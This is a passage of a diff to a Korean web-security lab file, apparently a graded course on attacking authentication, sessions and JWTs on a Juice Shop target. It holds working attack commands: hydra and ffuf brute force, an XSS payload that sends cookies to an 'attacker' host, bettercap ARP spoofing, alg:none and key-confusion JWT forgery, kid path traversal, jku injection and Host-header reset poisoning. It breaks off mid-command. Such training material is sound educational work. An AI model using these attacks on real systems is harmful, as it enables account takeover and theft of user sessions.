@@ -13,8 +13,53 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '{{WEB_IP}} 대상으로 로그인 메커니즘 분석을(를) 수행하시오.'
-  hint: 로그인 메커니즘 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 로그인 메커니즘 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 로그인 흐름 분석
+    ```bash
+    # 1. 정상 로그인
+    curl -i -X POST http://10.20.30.80/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+    # 응답에서 토큰 형식 (JWT vs cookie) 확인
+
+    # 2. 잘못된 비밀번호 (응답 차이)
+    curl -i -X POST http://target/rest/user/login \
+      -d '{"email":"admin@x.com","password":"wrong"}' -H 'Content-Type: application/json'
+
+    # 3. 미존재 사용자 (Username Enumeration 검증)
+    curl -i -X POST http://target/rest/user/login \
+      -d '{"email":"nobody@x.com","password":"any"}' -H 'Content-Type: application/json'
+    # 메시지가 "user not found" vs "wrong password" 으로 다르면 enumeration 가능
+    echo "로그인 메커니즘 분석 완료"
+    ```
+
+    ▶ 2단계: 도구 B — Burp Suite Repeater + Compare
+    1. Proxy 캡처 → Repeater 로 다양 변형
+    2. **Compare** 으로 응답 길이/시간/상태 차이 자동 식별
+
+    ▶ 3단계: 도구 C — sqlmap (인증 SQLi 자동)
+    ```bash
+    sqlmap -u "http://target/rest/user/login" \
+           --data='{"email":"a","password":"b"}' --batch --level=5 --risk=3
+    ```
+
+    ▶ 4단계: 인증 메커니즘 카테고리표
+    | 메커니즘 | 단서 |
+    |---|---|
+    | Session Cookie | `Set-Cookie: PHPSESSID=...` |
+    | JWT | `eyJ...` (header.payload.signature) |
+    | OAuth 2.0 | `redirect_uri` / `code` |
+    | SAML | XML POST + AuthnRequest |
+    | API Key | `X-API-Key` 헤더 |
+    | Basic Auth | `Authorization: Basic ...` |
+
+    ▶ 5단계: 답변
+    응답 + 토큰 형식 quote + 메커니즘 식별 + Username Enumeration 가능 여부.
+  hint: 'curl 정상/오류/미존재 비교 / Burp Compare / sqlmap auth / 메커니즘 표.'
   category: auth
   points: 8
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -42,8 +87,72 @@ steps:
       - 인증 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: '{{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을(를) 수행하시오.'
-  hint: 브루트포스 공격 시뮬레이션 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — hydra (가장 종합)
+    설치 (이미 됨): `sudo apt install hydra`. 사용:
+    ```bash
+    # HTTP form-based brute force
+    hydra -l admin@juice-sh.op \
+          -P /usr/share/wordlists/rockyou.txt \
+          10.20.30.80 \
+          http-post-form "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid"
+    # -l: 단일 user / -L: user list
+    # -P: password list
+    # http-post-form 의 :F= 는 실패 메시지 매칭
+
+    # JSON API
+    hydra -l admin -P pass.txt 10.20.30.80 \
+          http-post-form "/rest/user/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:F=Invalid:H=Content-Type\: application/json"
+    ```
+
+    ▶ 2단계: 도구 B — ffuf (빠른 fuzzing)
+    ```bash
+    ffuf -u http://10.20.30.80/rest/user/login \
+         -w pass.txt:PASS \
+         -X POST -H 'Content-Type: application/json' \
+         -d '{"email":"admin@juice-sh.op","password":"PASS"}' \
+         -mc 200 -fc 401  # 200=성공, 401=실패 필터
+    ```
+
+    ▶ 3단계: 도구 C — wfuzz (다중 변수)
+    ```bash
+    wfuzz -c -u http://target/rest/user/login \
+          -X POST -H 'Content-Type: application/json' \
+          -d '{"email":"FUZZ","password":"FUZ2Z"}' \
+          -w users.txt -w pass.txt \
+          --hh 401  # 401 응답 hide
+    ```
+
+    ▶ 4단계: 도구 D — Burp Intruder (GUI, cluster bomb)
+    1. 로그인 요청 → Intruder
+    2. email + password 둘 다 §...§ marking
+    3. Attack type → **Cluster bomb** (모든 조합)
+    4. Payload 1: users / Payload 2: rockyou
+    5. Start Attack → 응답 길이 차이로 성공 식별
+
+    ▶ 5단계: 도구 E — patator (다중 protocol 통합)
+    ```bash
+    sudo apt install patator
+    patator http_fuzz url=http://target/login \
+            method=POST body='email=admin&password=FILE0' \
+            0=pass.txt -x ignore:fgrep='Invalid'
+    ```
+
+    ▶ 6단계: 자주 쓰는 wordlist
+    | wordlist | 용도 |
+    |---|---|
+    | `/usr/share/wordlists/rockyou.txt` | 14M 일반 비밀번호 |
+    | SecLists `Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | top 1000 |
+    | `Passwords/seasons.txt` | 계절+숫자 변형 |
+    | CrackStation 사전 (1.5GB, 1.4B passwords) | 가장 큰 |
+
+    ▶ 7단계: 답변
+    hydra 또는 ffuf 출력 (성공한 password) quote + rate limit 확인 + 방어 (계정 잠금 / CAPTCHA / MFA) 1 문장.
+  hint: 'hydra http-post-form / ffuf -mc 200 / wfuzz 다중 / Burp Intruder Cluster Bomb / patator / SecLists wordlist.'
   category: auth
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -71,8 +180,65 @@ steps:
       - MFA 방어 맥락 없음
   target_vm: attacker
 - order: 3
-  instruction: '{{WEB_IP}} 대상으로 패스워드 정책 검증을(를) 수행하시오.'
-  hint: 패스워드 정책 검증 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 패스워드 정책 검증을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 다양한 패스워드 시도 (정책 검증)
+    ```bash
+    # 회원가입 endpoint 에서 다양 패스워드
+    PASSWORDS=("a" "12345" "password" "admin" "Pa\$\$word" "Passw0rd!" "VeryLong\$\$ecure123!")
+    for p in "${PASSWORDS[@]}"; do
+      RESP=$(curl -s -X POST http://10.20.30.80/api/Users \
+        -H 'Content-Type: application/json' \
+        -d "{\"email\":\"test+$RANDOM@x.com\",\"password\":\"$p\"}" -w '\n%{http_code}')
+      echo "=== '$p' → $RESP" | head -2
+    done
+    echo "패스워드 정책 검증 완료"
+    ```
+
+    ▶ 2단계: 정책 검증 항목 (NIST SP 800-63B + OWASP)
+    | 정책 | 권장값 |
+    |---|---|
+    | 최소 길이 | 8 자 이상 (NIST) / 12 자 (높은 보안) |
+    | 복잡도 | 대소문자 + 숫자 + 특수문자 (혹은 길이 ↑로 대체) |
+    | 사전 차단 | rockyou / haveibeenpwned API |
+    | 재사용 차단 | 최근 5~10 개 history |
+    | 만료 | NIST 권장 만료 안 함 (단 침해 시) |
+    | MFA | 2FA / WebAuthn 권장 |
+
+    ▶ 3단계: 도구 B — Have I Been Pwned API (k-Anonymity)
+    ```bash
+    # password 의 SHA1 hash 의 앞 5자리만 전송 → 일치 여부 확인
+    PASS="Password123"
+    HASH=$(echo -n "$PASS" | sha1sum | cut -d' ' -f1 | tr 'a-z' 'A-Z')
+    PREFIX=${HASH:0:5}
+    SUFFIX=${HASH:5}
+    curl -s "https://api.pwnedpasswords.com/range/$PREFIX" | grep -i "^$SUFFIX:"
+    # 출력: 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8:3861493 (3.8M회 노출)
+    ```
+
+    ▶ 4단계: 도구 C — pwninspector / zxcvbn (강도 측정)
+    ```bash
+    # zxcvbn (DropBox 의 password strength estimator)
+    npm install -g zxcvbn-cli
+    echo "Password123!" | zxcvbn-cli
+    # score: 0~4 (4 = 매우 안전)
+    # crack_time: 추정 크랙 시간
+    ```
+
+    ▶ 5단계: 도구 D — hashcat 으로 사전 공격 시뮬
+    ```bash
+    # 추출한 password 해시로 사전 공격
+    echo '0192023a7bbd73250516f069df18b500' > hash.txt
+    hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -O
+    # 빠르게 크랙되면 = 사전 공격 가능 = 약한 password
+    ```
+
+    ▶ 6단계: 답변
+    각 password 응답 (200=허용 / 400=거부) quote + 정책 위반 식별 + NIST 권장 1 문장.
+  hint: 'curl 다양 password / NIST 정책 표 / HIBP API k-anonymity / zxcvbn 강도 / hashcat 사전.'
   category: auth
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -100,8 +266,70 @@ steps:
       - NIST 기준 누락
   target_vm: attacker
 - order: 4
-  instruction: '{{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을(를) 수행하시오.'
-  hint: 세션 토큰 엔트로피 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 다수 토큰 수집
+    ```bash
+    ※ /tmp/tokens.txt
+    for i in $(seq 1 200); do
+      curl -s -X POST http://10.20.30.80/rest/user/login \
+        -H 'Content-Type: application/json' \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+        | jq -r '.authentication.token' >> /tmp/tokens.txt
+    done
+    wc -l /tmp/tokens.txt
+    ```
+
+    ▶ 2단계: 도구 B — Burp Sequencer (FIPS 140-2 통계 검정)
+    1. Burp Proxy → 로그인 요청 캡처
+    2. **Send to Sequencer**
+    3. Token Location: 응답 본문에서 토큰 부분 marking
+    4. **Live Capture** → 200~10000 토큰 자동 수집
+    5. **Analyze Now** → entropy / character set / FIPS 140-2 결과
+    6. < 60 bits 엔트로피 = 예측 가능 (취약)
+
+    ▶ 3단계: 도구 C — ent 명령 (Linux 통계 분석)
+    ```bash
+    sudo apt install ent
+    # base64 토큰을 binary 로 변환 후 분석
+    cat /tmp/tokens.txt | base64 -d > /tmp/tokens.bin 2>/dev/null
+    ent /tmp/tokens.bin
+    # 출력: Entropy = 7.998 bits per byte (이상적 8.0)
+    # Chi square distribution: 유의확률 (10%~90% 정상)
+    ```
+
+    ▶ 4단계: 도구 D — Python 통계 분석
+    ```python
+    import math
+    from collections import Counter
+    tokens = open('/tmp/tokens.txt').read().splitlines()
+    # Shannon entropy
+    all_chars = ''.join(tokens)
+    freq = Counter(all_chars)
+    total = sum(freq.values())
+    entropy = -sum((c/total) * math.log2(c/total) for c in freq.values())
+    print(f"Shannon entropy: {entropy:.2f} bits/char")
+    # JWT 의 base64 알파벳: ~6 bits/char 이상이 정상
+
+    # 길이/패턴 분석
+    print(f"length variance: {set(len(t) for t in tokens)}")  # 고정 길이여야
+    ```
+
+    ▶ 5단계: 약한 토큰 패턴 카탈로그
+    | 패턴 | 위험 |
+    |---|---|
+    | timestamp 포함 (`token_1715000000_user1`) | 추측 가능 |
+    | sequential ID (`token_1234`) | brute force |
+    | base64(md5(user)) | hash 역산 |
+    | 약한 JWT 비밀 키 | hashcat 크랙 |
+    | 짧음 (<128 bits) | 무차별 |
+
+    ▶ 6단계: 답변
+    Burp Sequencer 또는 ent 출력 quote (entropy 값) + FIPS 통과 여부 + 권장 (cryptographic random + 256 bits 이상) 1 문장.
+  hint: 'curl 다수 수집 / Burp Sequencer FIPS / ent 통계 / Python Shannon entropy / 약한 패턴 표.'
   category: session
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -129,8 +357,61 @@ steps:
       - 예측 가능성 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: '{{WEB_IP}} 대상으로 세션 고정 공격 테스트을(를) 수행하시오.'
-  hint: 세션 고정 공격 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 세션 고정 공격 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 세션 고정 공격 흐름
+    ```
+    1. 공격자가 valid 세션 ID 획득 (사이트 정상 방문)
+    2. 피해자에게 그 세션 ID 강제 (URL/cookie 주입)
+    3. 피해자가 그 세션으로 로그인
+    4. 서버가 로그인 시 세션 ID 재발급 안 하면
+       → 공격자가 같은 세션 ID 로 인증된 액세스 획득
+    ```
+
+    ▶ 2단계: 도구 A — curl 으로 세션 고정 검증
+    ```bash
+    # Stage 1: 공격자가 세션 받음
+    curl -c /tmp/attacker_cookies.txt http://10.20.30.80/
+    cat /tmp/attacker_cookies.txt | grep session
+    # 예: token=ATTACKER_SESS_123
+
+    # Stage 2: 피해자에게 그 토큰 강제 (URL 또는 XSS)
+    # 방법 A: URL 파라미터로 세션 ID 전달 (URL rewriting 활성 시)
+    curl "http://10.20.30.80/?session=ATTACKER_SESS_123"
+
+    # 방법 B: XSS 로 cookie 설정
+    # <script>document.cookie='session=ATTACKER_SESS_123; path=/'</script>
+
+    # Stage 3: 피해자가 로그인 (강제된 세션 사용)
+    curl -b /tmp/attacker_cookies.txt -X POST http://10.20.30.80/rest/user/login \
+         -d '{"email":"victim@x.com","password":"pass"}' -c /tmp/after_login.txt
+    diff /tmp/attacker_cookies.txt /tmp/after_login.txt
+    # 변경 없음 = 세션 재발급 안 함 = 취약
+
+    # Stage 4: 공격자가 재사용
+    curl -b "session=ATTACKER_SESS_123" http://10.20.30.80/dashboard
+    # 200 + 피해자 데이터 = 세션 고정 성공
+    echo "세션 고정 공격 테스트 완료"
+    ```
+
+    ▶ 3단계: 도구 B — Burp Repeater 으로 검증
+    1. 비로그인 상태 응답에서 세션 ID 추출
+    2. 로그인 요청 보낼 때 같은 ID 강제 (Cookie 헤더 수동 추가)
+    3. 로그인 후 응답의 Set-Cookie 비교 — *바뀌지 않으면 취약*
+
+    ▶ 4단계: 도구 C — OWASP ZAP Session Fixation rule
+    ```bash
+    docker run -t owasp/zap2docker-stable zap-baseline.py \
+      -t http://10.20.30.80 -r zap-report.html \
+      --config rule.40013.threshold=MEDIUM  # Session Fixation
+    ```
+
+    ▶ 5단계: 답변
+    `diff` 출력 (세션 ID 변경 없음) + Stage 4 dashboard 200 응답 quote + 방어 (`session_regenerate_id(true)` PHP / `request.changeSessionId()` Java) 1 문장.
+  hint: 'curl 4 단계 (획득→주입→로그인→재사용) / Burp Repeater 검증 / OWASP ZAP Session Fixation rule.'
   category: session
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -158,8 +439,69 @@ steps:
       - 세션 재생성 맥락 없음
   target_vm: attacker
 - order: 6
-  instruction: '{{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을(를) 수행하시오.'
-  hint: 세션 하이재킹 시뮬레이션 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 하이재킹 벡터 4 종
+    | 벡터 | 도구 | 조건 |
+    |---|---|---|
+    | XSS 로 document.cookie 탈취 | XSStrike + 외부 서버 | XSS 취약 + HttpOnly 미설정 |
+    | MITM 평문 캡처 | tcpdump / Wireshark / bettercap | HTTPS 미사용 또는 HSTS 미설정 |
+    | session sidejacking (open WiFi) | Ferret + Hamster | open WiFi |
+    | XSS + WebSocket | BeEF | XSS + cookie 탈취 |
+
+    ▶ 2단계: 도구 A — XSS 페이로드 (week03 lab 5 와 동일)
+    ```html
+    <script>
+    new Image().src='http://attacker:9999/?c='+document.cookie;
+    </script>
+    ```
+
+    ▶ 3단계: 도구 B — Wireshark / tcpdump (HTTPS 미사용 시)
+    ```bash
+    # attacker VM 에서
+    sudo tcpdump -i any -A 'tcp port 80 and host 10.20.30.80' -w /tmp/capture.pcap
+    # 다른 터미널: 트래픽 발생
+    # capture 분석
+    sudo tshark -r /tmp/capture.pcap -Y 'http.cookie' -T fields -e http.cookie | sort -u
+    ```
+
+    ▶ 4단계: 도구 C — bettercap (MITM 자동)
+    ```bash
+    sudo apt install bettercap
+    sudo bettercap -iface eth0
+    ※ set arp.spoof.targets 10.20.30.80
+    ※ arp.spoof on
+    ※ net.sniff on
+    # 또는 한 줄
+    sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.20.30.80; arp.spoof on; net.sniff on"
+    ```
+
+    ▶ 5단계: 도구 D — 탈취 쿠키 재사용
+    ```bash
+    # 탈취한 쿠키
+    STOLEN="session=abc123; csrf=xyz"
+    curl -H "Cookie: $STOLEN" http://10.20.30.80/dashboard
+    # 200 + 피해자 데이터 = 하이재킹 성공
+    echo "세션 하이재킹 시뮬레이션 완료"
+    ```
+
+    ▶ 6단계: 도구 E — Ferret + Hamster (open WiFi 자동)
+    ```bash
+    # 실제 환경 (Wi-Fi 모니터 모드 필요)
+    sudo airmon-ng start wlan0
+    ferret -i wlan0mon
+    hamster
+    # 브라우저 → http://localhost:1234 → 캡처된 세션 자동 이어가기
+    ```
+
+    ▶ 7단계: 답변
+    탈취 쿠키 + 재사용 응답 200 quote + 방어 (HttpOnly + Secure + HTTPS + HSTS + IP/User-Agent binding) 1 문장.
+
+    **윤리**: 점검 환경 only. 실 사용자 세션 탈취 = *형법상 정보통신망 침해*.
+  hint: '4 벡터 (XSS/MITM/sidejacking/BeEF) / Wireshark + tshark / bettercap MITM / 탈취 쿠키 재사용 / Ferret+Hamster open WiFi.'
   category: session
   points: 12
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -189,8 +531,81 @@ steps:
       - 재사용 맥락 없음
   target_vm: attacker
 - order: 7
-  instruction: '{{WEB_IP}} 대상으로 JWT 토큰 구조 분석을(를) 수행하시오.'
-  hint: JWT 토큰 구조 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 JWT 토큰 구조 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — base64 + jq 수동 디코딩
+    ```bash
+    # 1. JWT 획득
+    JWT=$(curl -s -X POST http://10.20.30.80/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+      | jq -r '.authentication.token')
+    echo "JWT: $JWT"
+
+    # 2. 3 부분 분해 (Header.Payload.Signature)
+    HEADER=$(echo "$JWT" | cut -d. -f1)
+    PAYLOAD=$(echo "$JWT" | cut -d. -f2)
+    SIG=$(echo "$JWT" | cut -d. -f3)
+
+    # 3. base64 decode (URL-safe → 표준 + padding)
+    b64url_decode() {
+      local s="$1"
+      # URL-safe → 표준 변환
+      s="${s//-/+}"
+      s="${s//_//}"
+      # padding 추가
+      local pad=$((4 - ${#s} % 4))
+      [[ $pad -lt 4 ]] && s="${s}$(printf '%*s' $pad | tr ' ' '=')"
+      echo -n "$s" | base64 -d 2>/dev/null
+    }
+
+    echo "=== Header ==="; b64url_decode "$HEADER" | jq .
+    echo "=== Payload ==="; b64url_decode "$PAYLOAD" | jq .
+    echo "=== Signature (raw bytes) ==="; b64url_decode "$SIG" | xxd | head -2
+    echo "JWT 토큰 구조 분석 완료"
+    ```
+    출력 예:
+    ```json
+    Header: {"typ":"JWT","alg":"HS256"}
+    Payload: {"sub":"admin","role":"admin","iat":1715000000,"exp":1715003600}
+    ```
+
+    ▶ 2단계: 도구 B — jwt_tool (가장 종합)
+    설치: `git clone https://github.com/ticarpi/jwt_tool ~/jwt_tool`. 사용:
+    ```bash
+    python3 ~/jwt_tool/jwt_tool.py "$JWT"
+    # 출력: Header decoded / Payload decoded / Signature analysis / 알려진 약점
+    ```
+
+    ▶ 3단계: 도구 C — pyjwt (Python lib)
+    ```python
+    import jwt
+    decoded = jwt.decode(token, options={"verify_signature": False})
+    print(decoded)  # 서명 검증 안 함 (분석용)
+    print(jwt.get_unverified_header(token))
+    ```
+
+    ▶ 4단계: 도구 D — jwt.io (웹 GUI)
+    https://jwt.io — JWT paste → 자동 디코딩 + 알고리즘 표시 + 비밀 키 검증 (HS* 만)
+
+    ▶ 5단계: JWT 표준 클레임
+    | 클레임 | 의미 |
+    |---|---|
+    | `iss` | issuer (발급자) |
+    | `sub` | subject (사용자) |
+    | `aud` | audience |
+    | `exp` | expiration time |
+    | `nbf` | not before |
+    | `iat` | issued at |
+    | `jti` | JWT ID (재사용 방지) |
+    | (커스텀) `role`, `email` | 권한/이메일 등 |
+
+    ▶ 6단계: 답변
+    Header / Payload JSON quote + alg 식별 (HS256/RS256/none) + 권한 클레임 (role/admin) 식별.
+  hint: 'base64 + jq 수동 디코딩 / jwt_tool 종합 / pyjwt / jwt.io GUI / 표준 클레임 표.'
   category: jwt
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -218,8 +633,77 @@ steps:
       - 구조 분석 없음
   target_vm: attacker
 - order: 8
-  instruction: '{{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트을(를) 수행하시오.'
-  hint: JWT 서명 검증 우회 테스트 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 우회 패턴 5종
+    ```
+    1. 서명 부분 제거 (header.payload. )
+    2. 서명 부분에 garbage
+    3. alg=none 변조 + 서명 빈 값 (CVE-2015-9235)
+    4. 알고리즘 혼동 (RS256 → HS256 with public key)
+    5. 약한 비밀 키 hashcat 크랙 후 재서명
+    ```
+
+    ▶ 2단계: 도구 A — jwt_tool 자동 우회
+    ```bash
+    cd ~/jwt_tool
+    # 1. 모든 알려진 우회 자동 시도
+    python3 jwt_tool.py "$JWT" -M at -t http://10.20.30.80/api/users
+    # -M: mode (at = all tests)
+    # -t: target URL (자동 검증)
+
+    # 2. alg:none 변조
+    python3 jwt_tool.py "$JWT" -X a
+    # 출력: 변조된 token + 사용 방법
+
+    # 3. 약한 키 brute force
+    python3 jwt_tool.py "$JWT" -C -d /usr/share/wordlists/rockyou.txt
+    # -C: crack mode
+    # -d: dict file
+    ```
+
+    ▶ 3단계: 도구 B — 수동 alg:none 변조
+    ```bash
+    # Header 변조: alg을 none 으로
+    NEW_HEADER=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+
+    # Payload 변조: role을 admin 으로
+    NEW_PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+
+    # 서명은 빈 값
+    FORGED="$NEW_HEADER.$NEW_PAYLOAD."
+
+    curl -H "Authorization: Bearer $FORGED" http://10.20.30.80/api/admin
+    # 200 = 서버가 alg:none 통과 = 취약 (CVE-2015-9235)
+    ```
+
+    ▶ 4단계: 도구 C — hashcat 으로 HS256 비밀 키 크랙
+    ```bash
+    # JWT 를 hashcat 형식으로 변환
+    echo "$JWT" > /tmp/jwt.txt
+    hashcat -a 0 -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
+    # -m 16500: JWT (HMAC-SHA256)
+    # 비밀 키 발견 시 → 새 JWT 발급 가능
+
+    # 발견된 비밀로 새 JWT 만들기
+    python3 -c "
+    import jwt
+    new = jwt.encode({'sub': 'admin', 'role': 'admin', 'exp': 9999999999}, 'CRACKED_SECRET', algorithm='HS256')
+    print(new)
+    "
+    ```
+
+    ▶ 5단계: 도구 D — Burp Suite + JWT Editor extension
+    1. BApp Store → "JSON Web Tokens" 설치
+    2. Repeater 에서 JWT 편집 GUI
+    3. 우클릭 → Sign → "alg:none" / "HS256" / "RS256→HS256" 선택
+
+    ▶ 6단계: 답변
+    변조된 token + curl 응답 200 quote + 우회 알고리즘 식별 + 방어 (alg 화이트리스트 + key 분리) 1 문장.
+  hint: 'jwt_tool -M at 자동 / 수동 alg:none / hashcat -m 16500 약한 키 / Burp JWT Editor / 5 우회 패턴.'
   category: jwt
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -249,8 +733,84 @@ steps:
       - 검증 맥락 없음
   target_vm: attacker
 - order: 9
-  instruction: '{{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을(를) 수행하시오.'
-  hint: JWT 알고리즘 변조 공격 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: alg 변조 공격 카테고리
+    | 공격 | CVE | 원리 |
+    |---|---|---|
+    | alg:none | CVE-2015-9235 | 서명 검증 비활성 |
+    | RS256 → HS256 (Key Confusion) | CVE-2016-10555 | 공개키를 HMAC 비밀로 사용 |
+    | kid (key ID) injection | — | DB 조회 키 변조 |
+    | jku (JWK Set URL) injection | — | 외부 키 URL 강제 |
+    | embedded JWK | — | 토큰 안에 키 포함 |
+
+    ▶ 2단계: 도구 A — jwt_tool 으로 자동 alg 변조
+    ```bash
+    # alg:none
+    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X a
+    # 출력: 변조된 토큰
+
+    # RS256 → HS256 key confusion (공개키 필요)
+    # 1. 서버의 공개키 다운로드
+    curl -s http://10.20.30.80/.well-known/jwks.json -o /tmp/jwks.json
+    # 또는
+    curl -s http://10.20.30.80/jwt/public-key.pem -o /tmp/pub.pem
+
+    # 2. jwt_tool 으로 변조
+    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X k -pk /tmp/pub.pem
+    # -X k: key confusion mode
+
+    # 3. kid injection
+    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X i
+    # -X i: kid path traversal
+    ```
+
+    ▶ 3단계: 도구 B — 수동 RS256 → HS256 변조 (Python)
+    ```python
+    import jwt
+
+    with open('/tmp/pub.pem', 'rb') as f:
+        public_key = f.read()
+
+    # 공개키를 HMAC 비밀로 사용 (서버가 alg 을 신뢰하면 통과)
+    forged = jwt.encode(
+      {"sub": "admin", "role": "admin", "exp": 9999999999},
+      public_key,  # 이상함 (공개키를 비밀로) — 그래서 attack 이름이 "key confusion"
+      algorithm='HS256',
+      headers={'alg': 'HS256'}
+    )
+    print(forged)
+    ```
+
+    ▶ 4단계: 도구 C — kid injection (LFI / SQLi 통한 키 우회)
+    ```bash
+    # kid 가 file path 로 사용되는 경우 (LFI)
+    NEW_HEADER=$(echo -n '{"alg":"HS256","kid":"../../../../../../dev/null"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+    # /dev/null 은 빈 키 → empty key 로 HMAC 시도
+    EMPTY_HMAC=$(echo -n "$NEW_HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
+    FORGED="$NEW_HEADER.$PAYLOAD.$EMPTY_HMAC"
+    curl -H "Authorization: Bearer $FORGED" http://target/api/admin
+    ```
+
+    ▶ 5단계: 도구 D — jku / x5u URL injection
+    ```bash
+    # 공격자 호스팅 키
+    cat > /tmp/jwks.json <<EOF
+    {"keys":[{"kty":"RSA","kid":"attacker","n":"...","e":"AQAB"}]}
+    EOF
+    python3 -m http.server 8000 --directory /tmp &
+
+    # JWT 의 jku 헤더를 attacker 로 변조
+    NEW_HEADER=$(echo -n '{"alg":"RS256","jku":"http://attacker:8000/jwks.json","kid":"attacker"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
+    # private key 로 서명 후 전송
+    ```
+
+    ▶ 6단계: 답변
+    변조 토큰 + curl 응답 200 quote + 변조 종류 (alg:none / key confusion / kid / jku) + 방어 (alg 화이트리스트 + key 종류별 검증 + jku 화이트리스트) 1 문장.
+  hint: 'alg 변조 표 (CVE-2015-9235, CVE-2016-10555) / jwt_tool -X a/k/i / 수동 RS→HS / kid LFI / jku URL.'
   category: jwt
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
@@ -278,8 +838,69 @@ steps:
       - 취약점 인용 없음
   target_vm: attacker
 - order: 10
-  instruction: '{{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을(를) 수행하시오.'
-  hint: 패스워드 리셋 취약점 분석 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 패스워드 리셋 취약점 카테고리 (8 패턴)
+    ```
+    1. 토큰 예측 가능 (timestamp / sequential)
+    2. 토큰 만료 미설정
+    3. 토큰 재사용 가능
+    4. 다른 사용자 토큰 사용 가능
+    5. host header injection (reset URL 변조)
+    6. 비밀 질문 약함
+    7. user enumeration
+    8. rate limit 없음
+    ```
+
+    ▶ 2단계: 도구 A — curl 으로 토큰 분석
+    ```bash
+    # 1. 다수 토큰 발급
+    ※ /tmp/reset_tokens.txt
+    for i in 1 2 3 4 5; do
+      curl -s -X POST http://10.20.30.80/api/forgot-password \
+        -d "email=test$i@x.com" -H 'Content-Type: application/json'
+      # 메일 본문 또는 응답에서 토큰 추출 (실 환경: 메일 시뮬레이터)
+    done
+
+    # 2. timestamp 패턴 검증 (예측 가능?)
+    cat /tmp/reset_tokens.txt | sort | head
+    # 토큰이 단조증가 → 예측 가능
+
+    # 3. 만료 검증 (24h 후 재사용 가능?)
+    TOKEN_OLD="..."  # 어제 발급
+    curl -X POST http://10.20.30.80/api/reset-password \
+         -d "{\"token\":\"$TOKEN_OLD\",\"password\":\"new\"}"
+    # 200 = 만료 안 함 = 취약
+    ```
+
+    ▶ 3단계: 도구 B — Host Header Injection (reset URL 변조)
+    ```bash
+    # 정상 reset 메일은: http://victim.com/reset?token=...
+    # Host 헤더 변조 시 메일에 attacker.com 가 포함될 수 있음
+    curl -X POST -H "Host: attacker.com" \
+         http://10.20.30.80/api/forgot-password \
